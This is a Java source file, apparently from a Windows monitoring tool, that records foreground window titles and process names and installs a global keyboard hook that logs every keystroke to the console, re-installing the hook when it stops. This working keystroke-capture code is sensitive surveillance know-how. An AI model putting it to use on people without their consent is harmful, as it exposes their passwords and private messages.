package br.com.mrezzosoftware.machineguardianmonitorprotect.windows;

import br.com.mrezzosoftware.machineguardianmonitorprotect.core.*;
import com.melloware.jintellitype.HotkeyListener;
import com.melloware.jintellitype.IntellitypeListener;
import com.melloware.jintellitype.JIntellitype;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.PointerByReference;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.sf.feeling.swt.win32.extension.Win32;
import org.sf.feeling.swt.win32.extension.hook.Hook;
import org.sf.feeling.swt.win32.extension.hook.data.HookData;
import org.sf.feeling.swt.win32.extension.hook.data.KeyboardHookData;
import org.sf.feeling.swt.win32.extension.hook.listener.HookEventListener;

/**
 *
 * @author Marina
 */
public class Windows {

    public final Processos Processos;
    public final Teclado Teclado;

    public Windows() {
        Processos = new Processos();
        Teclado = new Teclado();
    }

    public class Processos {

        private MyUser32 user32 = (MyUser32) Native.loadLibrary("user32", MyUser32.class);
        private MyKernel32 kernel32 = (MyKernel32) Native.loadLibrary("kernel32", MyKernel32.class);
        private MyPsapi psapi = (MyPsapi) Native.loadLibrary("psapi", MyPsapi.class);

        private Processos() {
        }

        /**
         * Retorna o nome do processo da janela que está ativa (em primeiro
         * plano).
         *
         * @return String nome do processo da janela ativa
         */
        public String getNomeProcessoJanelaAtiva() {
            char[] nomeExecutavel = new char[1024 * 2];
            PointerByReference ponteiroIdProcesso = new PointerByReference();

            user32.GetWindowThreadProcessId(user32.GetForegroundWindow(), ponteiroIdProcesso);
            WinNT.HANDLE processo = kernel32.OpenProcess(MyKernel32.PROCESS_QUERY_INFORMATION | MyKernel32.PROCESS_VM_READ,
                    false,
                    ponteiroIdProcesso.getValue());

            psapi.GetModuleBaseNameW(processo, null, nomeExecutavel, 1024);
            kernel32.CloseHandle(processo);

            return Native.toString(nomeExecutavel);
        }

        /**
         * Retorna o título da janela que está ativa (em primeiro plano).
         *
         * @return String título da janela ativa
         */
        public String getTituloJanelaAtiva() {
            byte[] windowText = new byte[512];

            user32.GetWindowTextA(user32.GetForegroundWindow(), windowText, user32.GetWindowTextLengthA(user32.GetForegroundWindow()) + 1);

            return Native.toString(windowText);
        }
    }

    public class Teclado implements HotkeyListener, IntellitypeListener {

        private boolean isTeclaPressionada = false;
        private boolean isTeclaMantidaPressionada = false;
        private boolean shiftPressionado = false;
        private boolean ctrlPressionado = false;
        private boolean altPressionado = false;
        private boolean isCapslockAtivado = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
        private boolean rodando = false;
        private char acento;
        private char teclaDigitada;
        private int quantidadeTeclasHotKeyImpressa = 0;
        private int controlaTeclaImpressa = 0;
        private int vkCode, scanCode;
        private int totalRepeticoesTeclasEspeciaisPressionadas = 1;
        private int totalRepeticoesTeclasNormaisPressionadas = 0;
        private int tamanhoLinhaAtual = 0;
        private KeyboardHookData keyboardHookData;
        private HookEventListener hookEventListener;
        private Caracter caracter = new Caracter();
        private String caracterEspecial = "";
        private StringBuffer palavra = new StringBuffer();
        private final int CTRL_ALT_DEL = 0;
        private final int CTRL_A = 1;

        private Teclado() {
            criarObjetos();
        }

        private void criarObjetos() {
            hookEventListener = new HookEventListener() {

                @Override
                public void acceptHookData(HookData hookData) {

                    controlaTeclaImpressa = 1;

                    if (quantidadeTeclasHotKeyImpressa == 0) {

                        keyboardHookData = (KeyboardHookData) hookData;
                        // Indica se a tecla foi pressionada (keyPressed = true) ou solta (keyReleased = false).
                        isTeclaPressionada = keyboardHookData.getTransitionState();
                        // Indica se a tecla pressionada anteriormente continua mantida pressionada.
                        isTeclaMantidaPressionada = keyboardHookData.getPreviousState();
                        // Obtém o Virtual Key Code da tecla pressionada.
                        vkCode = keyboardHookData.getWParam();

                        if (isTeclaPressionada) {

                            if (isPressedShift(vkCode)) {
                                shiftPressionado = true;
                            }

                            if (!caracter.isAcento(vkCode)) {

                                teclaDigitada = caracter.converteASCIItoCHAR(vkCode, scanCode);

                                if (caracter.isVogal(teclaDigitada) && acento != '0') {
                                    char s = caracter.vogalAcentuada(teclaDigitada, acento);
                                    imprimeChar(s);

                                    acento = '0';

                                } else if (!Character.isISOControl(teclaDigitada) && caracter.isCaracterEspecial(vkCode).equalsIgnoreCase("")) {

                                    char s = caracter.shiftCharacter(teclaDigitada, shiftPressionado);
                                    imprimeChar(s);

                                } else if (!caracter.isCaracterEspecial(vkCode).equalsIgnoreCase("")) {

                                    caracterEspecial = caracter.isCaracterEspecial(vkCode);

                                    if (caracterEspecial.equalsIgnoreCase("[CAPSLOCK]")) {
                                        if ((isCapslockAtivado = !isCapslockAtivado) == true) {
                                            caracterEspecial += "[ON]";
                                        } else {
                                            caracterEspecial += "[OFF]";
                                        }
                                    } else if (caracterEspecial.equalsIgnoreCase("[ENTER]")) {
                                        caracterEspecial += "\n";
                                        tamanhoLinhaAtual = 0;
                                    } else if (caracterEspecial.equalsIgnoreCase("[CTRL]")) {
                                        ctrlPressionado = true;
                                    } else if (caracterEspecial.equalsIgnoreCase("[ALT]")) {
                                        altPressionado = true;
                                    }

                                    imprimeString(caracterEspecial);
                                    caracterEspecial = "";
                                }

                            } else {

                                acento = caracter.getAcento(vkCode, shiftPressionado);
                            }

                            if (!caracter.isCaracterEspecial(vkCode).equalsIgnoreCase("")) {
                                caracterEspecial += caracter.isCaracterEspecial(vkCode);
                            }

                        } else if (!isTeclaPressionada) {

                            if (!caracter.isCaracterEspecial(vkCode).equalsIgnoreCase("")) {
                                
                                caracterEspecial = caracter.isCaracterEspecial(vkCode);
                                
                                if (caracterEspecial.equalsIgnoreCase("[SHIFT]")) {
                                    shiftPressionado = false;
                                } else if (caracterEspecial.equalsIgnoreCase("[CTRL]")) {
                                    ctrlPressionado = false;
                                } else if (caracterEspecial.equalsIgnoreCase("[ALT]")) {
                                    altPressionado = false;
                                }

                                if (ctrlPressionado) {

                                    if (altPressionado && caracterEspecial.equalsIgnoreCase("[DELETE]")) {
                                        imprimeString(caracterEspecial);
                                    } else if (shiftPressionado && caracterEspecial.equalsIgnoreCase("[ESC]")) {
                                        imprimeString(caracterEspecial);
                                    }
                                }

                                if (altPressionado) {

                                    if (caracterEspecial.equalsIgnoreCase("[TAB]")) {
                                        imprimeString(caracterEspecial);
                                    } else if (caracterEspecial.equalsIgnoreCase("[F4]")) {
                                        imprimeString(caracterEspecial);
                                    }

                                }
                                
                                caracterEspecial = "";
                            }
                        }
                    }

                    if (quantidadeTeclasHotKeyImpressa > 0) {
                        quantidadeTeclasHotKeyImpressa--;
                    }

                }
            };
        }

        public void iniciarCapturaTeclasDigitadas() {
            Hook.KEYBOARD.addListener(Windows.this, hookEventListener);
            Hook.KEYBOARD.install(Windows.this);
            rodando = true;

            new Thread(new Runnable() {

                @Override
                public void run() {

                    while (rodando) {
                        if (controlaTeclaImpressa == 0 && Hook.KEYBOARD.isInstalled(Windows.this)) {
                            Hook.KEYBOARD.uninstall(Windows.this);
                            Hook.KEYBOARD.install(Windows.this);
                        }
                        controlaTeclaImpressa = 0;
                        try {
                            
                            Thread.sleep(3000);
                        } catch (InterruptedException ex) {
                            Logger.getLogger(Windows.class.getName()).log(Level.SEVERE, null, ex);
                        }
                    }
                    System.out.println("Removendo");
                    Hook.KEYBOARD.removeListener(Windows.this, hookEventListener);
                    Hook.KEYBOARD.uninstall(Windows.this);
                }
            }).start();

            //registrarHotKeys();
        }

        public void pararCapturaTeclasDigitadas() {
            Hook.KEYBOARD.removeListener(Windows.this, hookEventListener);
            Hook.KEYBOARD.uninstall(Windows.this);

//            desregistrarHotKeys();
        }

        private void registrarHotKeys() {

            if (JIntellitype.isJIntellitypeSupported()) {
                System.out.println("SUPORTADO");
                JIntellitype.getInstance().registerHotKey(CTRL_ALT_DEL, JIntellitype.MOD_CONTROL + JIntellitype.MOD_ALT, Teclas.VkCode.Delete.getVkCode());
                JIntellitype.getInstance().registerHotKey(CTRL_A, JIntellitype.MOD_CONTROL, Teclas.VkCode.A.getVkCode());
                JIntellitype.getInstance().addHotKeyListener(this);
            }
        }

        private void desregistrarHotKeys() {
            JIntellitype.getInstance().unregisterHotKey(CTRL_ALT_DEL);
            JIntellitype.getInstance().removeHotKeyListener(this);
        }

        private boolean isPressedShift(int key) {

            return (key == Win32.VK_SHIFT);

        }

        private void imprimeChar(char s) {
            
            System.out.print(captulacaoCorreta(s));
            adicionarValorTamanhoLinhaAtual(1);
            totalRepeticoesTeclasNormaisPressionadas = 0;
            

            if (totalRepeticoesTeclasNormaisPressionadas > 1) {
                for (int i = 0; i < totalRepeticoesTeclasNormaisPressionadas; i++) {
                    System.out.print(captulacaoCorreta(s));
                    
                }
            } else {
                if (isTeclaMantidaPressionada
                        && !caracterEspecial.equalsIgnoreCase("")
                        && !caracterEspecial.equalsIgnoreCase("NOT_PRINT")) {
                    imprimeString(caracterEspecial);
                    caracterEspecial = "NOT_PRINT";
                }
                
            }
        }

        private void imprimeString(String s) {

            if (totalRepeticoesTeclasEspeciaisPressionadas > 1) {
                for (int i = 0; i < totalRepeticoesTeclasEspeciaisPressionadas; i++) {
                    System.out.print(s);
                    adicionarValorTamanhoLinhaAtual(s.length());
                }
            } else {
                System.out.print(s);
                adicionarValorTamanhoLinhaAtual(s.length());
            }

            totalRepeticoesTeclasEspeciaisPressionadas = 1;
        }

        public void lePalavra(char key) {

            if (!palavra.equals(null)) {

                if (Character.isSpaceChar(key)) {
                    int ini = 0;
                    int fim = palavra.length();
                    //System.out.println(palavra.toString());
                    palavra.delete(ini, fim);

                } else {
                    palavra.append(key);
                }


            }


        }

        private char captulacaoCorreta(char aCaracter) {
            return (shiftPressionado || isCapslockAtivado) ? Character.toUpperCase(aCaracter) : aCaracter;
        }

        private void adicionarValorTamanhoLinhaAtual(int tamanho) {
            tamanhoLinhaAtual += tamanho;

            if (tamanhoLinhaAtual >= 80) {
                System.out.println("");
                tamanhoLinhaAtual = 0;
            }
        }

        @Override
        public void onHotKey(int i) {
            if (i == CTRL_A) {
                imprimeString("[CTRL]+A");
                quantidadeTeclasHotKeyImpressa = 2;
            }
        }

        @Override
        public void onIntellitype(int i) {
            throw new UnsupportedOperationException("Not supported yet.");
        }
    }
}
